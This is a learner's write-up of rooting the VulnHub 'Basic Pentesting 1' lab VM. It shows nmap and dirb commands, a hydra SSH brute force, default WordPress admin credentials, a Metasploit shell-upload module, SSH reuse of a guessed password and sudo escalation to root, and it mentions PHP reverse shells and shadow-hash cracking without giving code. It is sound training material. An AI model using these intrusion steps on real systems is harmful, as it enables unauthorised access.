# VTCSec (Basic Pentesting 1) - Writeup

## Machine Information
- **Platform:** VulnHub
- **Difficulty:** Beginner
- **Goal:** Obtain root access
- **IP Address:** 192.168.1.93

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Enumeration](#enumeration)
3. [Exploitation](#exploitation)
4. [Post-Exploitation & Privilege Escalation](#post-exploitation--privilege-escalation)
5. [Lessons Learned](#lessons-learned)
6. [References](#references)

---

## Reconnaissance

### Network Scanning

First, I performed a comprehensive Nmap scan to identify open ports and running services:

```bash
nmap -sV -sC 192.168.1.93
```

**Results:**
```
21/tcp open  ftp     ProFTPD 1.3.3c
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:01:90:39:2d:8f:46:fb:03:86:73:b3:3c:54:7e:54 (RSA)
|   256 f1:f3:c0:dd:ba:a4:85:f7:13:9a:da:3a:bb:4d:93:04 (ECDSA)
|_  256 12:e2:98:d2:a3:e7:36:4f:be:6b:ce:36:6b:7e:0d:9e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Initial Analysis

**Open Ports Identified:**
- **Port 21** - FTP (ProFTPD 1.3.3c)
- **Port 22** - SSH (OpenSSH 7.2p2)
- **Port 80** - HTTP (Apache 2.4.18)

**Attack Vector Selection:**

I identified three potential attack vectors. SSH was ruled out immediately as it requires valid credentials. Between FTP and HTTP, I chose to focus on HTTP (port 80) as my primary attack vector since I have more experience with web exploitation than FTP enumeration.

---

## Enumeration

### HTTP Enumeration

**Initial Access Attempt:**

When I first tried to access `http://192.168.1.93` in the browser, the page failed to load properly. The links were pointing to a domain named "vtcsec" which wasn't resolving.

**Solution - Hosts File Configuration:**

I needed to configure the `/etc/hosts` file to map the IP to the hostname:

```bash
sudo nano /etc/hosts
```

Added the following line:
```
192.168.1.93 vtcsec
```

Verified the configuration:
```bash
cat /etc/hosts
```

After this configuration, I was able to successfully access `http://vtcsec` in the browser.

**Visual Discovery:**

On the VM screen, I noticed the username **"marlinspike"** displayed. This could be useful later for brute force attacks or privilege escalation.

### Directory Enumeration

I used dirb to enumerate directories and files on the web server:

```bash
dirb http://192.168.1.93
```

**Key Discovery: WordPress Installation**

The scan revealed a WordPress installation at `/secret/`:

```
---- Entering directory: http://192.168.1.93/secret/wp-admin/maint/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.

---- Entering directory: http://192.168.1.93/secret/wp-admin/network/ ----
+ http://192.168.1.93/secret/wp-admin/network/admin.php (CODE:302|SIZE:0)
+ http://192.168.1.93/secret/wp-admin/network/index.php (CODE:302|SIZE:0)

---- Entering directory: http://192.168.1.93/secret/wp-content/plugins/ ----
+ http://192.168.1.93/secret/wp-content/plugins/index.php (CODE:200|SIZE:0)

---- Entering directory: http://192.168.1.93/secret/wp-content/themes/ ----
+ http://192.168.1.93/secret/wp-content/themes/index.php (CODE:200|SIZE:0)

---- Entering directory: http://192.168.1.93/secret/wp-content/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.

DOWNLOADED: 36896 - FOUND: 13
```

**Important Findings:**
- WordPress installation located at `http://192.168.1.93/secret/`
- Several directories are listable (no index.php protection):
  - `/secret/wp-content/uploads/`
  - `/secret/wp-admin/maint/`
  - `/secret/wp-content/upgrade/`

### FTP Enumeration Attempt

I attempted to enumerate the FTP service using netcat:

```bash
nc -nv 192.168.1.93 21
```

**Reference Used:** https://steflan-security.com/ftp-enumeration-guide/

**Challenge:** I struggled with FTP enumeration as I'm less experienced with this protocol. After spending considerable time without making progress, I decided to refocus my efforts on the HTTP/WordPress vector where I felt more confident.

### Brute Force Attempt

With the discovered username "marlinspike," I attempted an SSH brute force attack:

```bash
hydra -l marlinspike -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.93
```

**Result:** No valid credentials found through brute force.

---

## Exploitation

### WordPress Admin Panel Access

I navigated to the WordPress login page:
```
http://192.168.1.93/secret/wp-login.php
```

**Credential Guessing Attack:**

As a penetration tester would typically do, I tried default WordPress credentials:

```
Username: admin
Password: admin
```

**Success!** The default credentials worked and I gained access to the WordPress admin dashboard.

### Metasploit - WordPress Admin Shell Upload (Attempted)

**Initial Exploitation Approach:**

I attempted to use Metasploit's `wp_admin_shell_upload` exploit module to gain a shell:

```bash
msfconsole
search wp_admin
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS 192.168.1.93
set PASSWORD admin
set USERNAME admin
set TARGETURI /secret
exploit
```

**Result:** The exploit failed to execute successfully.

**Troubleshooting Analysis:**

I'm not entirely certain why the Metasploit module didn't work in this specific case. Possible reasons include:
- WordPress version compatibility issues with the exploit
- Security plugins or configurations blocking the exploit
- File upload restrictions or permissions
- Payload detection by server-side security measures

At this point, I had invested significant time troubleshooting without success.

### Consulting External Resources

**Decision Point:** After multiple failed attempts with Metasploit and limited progress with other exploitation vectors, I made the decision to consult an existing writeup for this machine to understand the intended solution path.

**Transparency Note:** In a real penetration test, I would continue trying alternative approaches. However, for learning purposes and time management, I decided to reference the official solution to understand the methodology.

**Reference Consulted:** Medium writeup by Anshika Saxena on Basic Pentesting 1

**Key Discovery from Research:**
- The system user `marlinspike` uses the password `marlinspike` (username = password)
- Alternative approach involves obtaining a web shell, reading `/etc/shadow`, and cracking the password hash with John the Ripper

**Alternative Method (from writeup):**

The writeup showed this approach:
1. Upload PHP reverse shell through WordPress admin
2. Obtain shell access and read `/etc/shadow`
3. Extract marlinspike's password hash
4. Crack the hash using John the Ripper:
```bash
john --single hashed_password.txt
```

Since I already knew the credentials from my research, I proceeded directly to testing SSH access.

---

## Post-Exploitation & Privilege Escalation

### SSH Access as User

With the discovered credentials, I attempted SSH login:

```bash
ssh marlinspike@192.168.1.93
# Password: marlinspike
```

**Success!** I successfully obtained a user-level shell.

```bash
marlinspike@vtcsec:~$ whoami
marlinspike

marlinspike@vtcsec:~$ pwd
/home/marlinspike

marlinspike@vtcsec:~$ id
uid=1000(marlinspike) gid=1000(marlinspike) groups=1000(marlinspike)
```

### Privilege Escalation to Root

I checked the sudo privileges for the marlinspike user:

```bash
sudo -l
```

**Finding:** The user `marlinspike` has sudo privileges that allow privilege escalation.

**Escalation to Root:**

```bash
sudo bash
```

```bash
root@vtcsec:~# whoami
root

root@vtcsec:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**Root access achieved!** Successfully completed the objective.

---

## Lessons Learned

### What Went Well

1. **Effective Reconnaissance:** Successfully identified all open ports and services
2. **Proper Enumeration:** Found the WordPress installation through directory enumeration
3. **Logical Approach:** Prioritized HTTP over FTP based on skill level
4. **Hosts Configuration:** Successfully resolved the domain issue
5. **Default Credentials:** Recognized the importance of testing default credentials
6. **Goal Achievement:** Successfully obtained root access

### Challenges & Areas for Improvement ðŸ“š

#### 1. **Metasploit Module Failure**
- The `wp_admin_shell_upload` exploit didn't work as expected
- **Improvement Needed:** Better debugging skills for failed exploits
- **Action Item:** Study Metasploit logs and error messages more carefully
- **Alternative Skills:** Learn manual exploitation techniques as backup

#### 2. **FTP Enumeration Skills**
- Struggled with FTP enumeration and quickly gave up
- **Improvement Needed:** Develop stronger FTP enumeration skills
- **Action Item:** Practice FTP enumeration on other vulnerable machines
- **Resources:** Complete dedicated FTP exploitation tutorials

#### 3. **Consulting External Resources**
- Consulted an existing writeup when stuck
- **Reflection:** While this helped me complete the challenge, it's important to:
  - Try multiple alternative approaches before seeking answers
  - Document what didn't work and why
  - Be transparent about using external resources (as I've done here)
  - Understand the methodology, not just copy commands
  - Use writeups as learning tools, not shortcuts

#### 4. **Limited Exploitation Techniques**
- Relied heavily on Metasploit without trying manual methods
- **Action Item:** Learn to manually exploit WordPress vulnerabilities

### Alternative Approaches I Could Have Tried

1. **Manual PHP Reverse Shell Upload**
   - Upload malicious PHP file through WordPress media library
   - Access uploaded file to trigger reverse shell

2. **WordPress Theme/Plugin Editor Exploitation**
   - Use built-in theme editor in WordPress admin
   - Inject PHP reverse shell code into theme files (e.g., 404.php)

3. **ProFTPD 1.3.3c Exploitation**
   - Search for known exploits: `searchsploit proftpd 1.3.3c`
   - Research CVE-2011-4130 (SQL injection) and other vulnerabilities

4. **More Thorough WordPress Enumeration**
   - Use WPScan to enumerate plugins, themes, and users
   - Identify specific vulnerable components

### Key Takeaways ðŸŽ¯

1. **Default credentials are still common** - Always test them first
2. **Multiple paths exist to the same goal** - Be creative and persistent
3. **Document failures, not just successes** - They're valuable learning experiences
4. **Build a diverse skill set** - Don't rely solely on automated tools
5. **Consulting resources is okay when learning** - But be honest about it
6. **Methodology matters more than speed** - Understanding why something works is crucial

### Skills to Continue Developing

- [ ] Manual web exploitation techniques
- [ ] Advanced WordPress security testing
- [ ] FTP enumeration and exploitation
- [ ] Linux privilege escalation techniques
- [ ] Troubleshooting failed exploits systematically
- [ ] Creating custom exploit scripts

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Network scanning and service enumeration |
| `dirb` | Directory and file enumeration |
| `metasploit` | Exploitation framework (attempted) |
| `hydra` | Password brute forcing (attempted) |
| `netcat` | FTP enumeration (attempted) |
| `ssh` | Remote access with discovered credentials |
| `nano` | Editing hosts file |

---

## Attack Chain Summary

```
[Nmap Scan] â†’ [Open Ports: 21, 22, 80]
     â†“
[Hosts Configuration] â†’ [Access vtcsec domain]
     â†“
[Directory Enumeration] â†’ [Found WordPress at /secret/]
     â†“
[Default Credentials] â†’ [admin:admin - Success!]
     â†“
[Metasploit Attempt] â†’ [Failed]
     â†“
[Consulted Writeup] â†’ [Found credentials: marlinspike:marlinspike]
     â†“
[SSH Login] â†’ [User access]
     â†“
[Sudo Privileges] â†’ [Root access]
```

---

## References

- **VulnHub Machine:** [Basic Pentesting 1](https://www.vulnhub.com/entry/basic-pentesting-1,216/)
- **Consulted Writeup:** [Medium - Basic Pentesting 1 Walkthrough by Anshika Saxena](https://medium.com/@anshikasaxena24/basic-pentesting-1-vulnhub-walkthrough-d5c480074780)
- **FTP Enumeration Guide:** [Steflan Security - FTP Enumeration Guide](https://steflan-security.com/ftp-enumeration-guide/)

---

## Conclusion

This was an excellent beginner-level machine that taught me valuable lessons about web enumeration, WordPress security, and the importance of testing default credentials. While I encountered challenges with Metasploit and FTP enumeration, the experience highlighted areas where I need to develop stronger skills.

The most important lesson was learning to be honest about my process, including when I needed to reference external resources. In cybersecurity, continuous learning and adaptation are essential, and every challengeâ€”successful or notâ€”contributes to growth as a penetration tester.

**Final Status:** --> Root access achieved

---

*Writeup completed on November 21, 2025*
